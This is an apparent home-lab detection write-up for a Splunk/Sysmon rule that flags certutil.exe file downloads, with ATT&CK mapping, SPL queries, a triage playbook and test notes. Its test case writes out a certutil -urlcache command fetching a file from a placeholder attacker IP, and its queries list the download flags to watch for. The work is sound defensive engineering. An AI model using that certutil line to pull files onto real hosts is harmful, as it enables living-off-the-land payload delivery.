# Detection 01 – Suspicious certutil file retrieval

### Purpose 
Detect potential file downloads using certutil.exe (common LOLBIN tradecraft)

### ATT&CK Mapping

ATT&CK: T1218.010 – Signed Binary Proxy Execution (certutil)

### Data Source 

| Source | Details |
|--------|---------|
| Sysmon | EventID 1 (Process Creation) |

---

### Test Case

**Case 1)** Pull a harmless file from a remote server using certutil (Windows Defender enabled)

Expected Result: Blocked by defender - No results to show in Splunk

```powershell
# 1. On attacker box:
   	echo test > harmless.txt && python3 -m http.server 8000

# 2. On Windows Endpoint:
	certutil -urlcache -split -f http://<attacker_ip>:8000/harmless.txt C:\Temp\harmless.txt

# 3. Run SPL to detect activity
```
---

### SPL Detection Queries 

**Production Rule**
```spl
index=main sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
Image="*\\certutil.exe" 
| search CommandLine="*-urlcache*" OR CommandLine="*-split*" OR CommandLine="*-decode*" OR CommandLine="*http:*" OR CommandLine="*https:*"
| table _time host User Image CommandLine ParentImage ProcessGuid
```
**Hunter Compnaion (Any Certutil execution)**
```spl
index=main sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
Image="*\\certutil.exe*"
| stats count by host User ParentImage CommandLine
| sort -count
```
---

### Notes:

- Windows defender blocked the execution of certutil for this test case and hence nothing is logged and sent to Splunk
- Defender also blocks execution when grabbing the file from localhost
- In the event Defender is disabled, this rule should detect the suspicious execution of certutil. (Will test and update later)
- To prove the detection pipline works, I used certutil to -hashfile and validate that events show up in Splunk.

### False Positive Cases

- Rare testing/admin tasks

### Mitigations and tuning

- Easiest mitigation is to ensure Defender is properly configured and running
- Whitelist trusted admin accounts/hosts
- Automate file analysis that pulls the file from the event and scans it with virustotal

### Playbook
On detection:

1. Check the User field and correlate with whitelisted admin accounts
2. Check the file hash that was downloaded with virustotal, if a known malicious hash is detected -> Isolate host and Escalate.
3. Check for persistence or defense evasion (Defender changes, Other file downloads, dropped files, installs, registry changes) 
4. Ensure defender is enabled and configured proeprly

---

### Status

- Test Case verified as blocked by Defender
- Plan to test a case with defender disabled and then update
- Not production ready as of yet



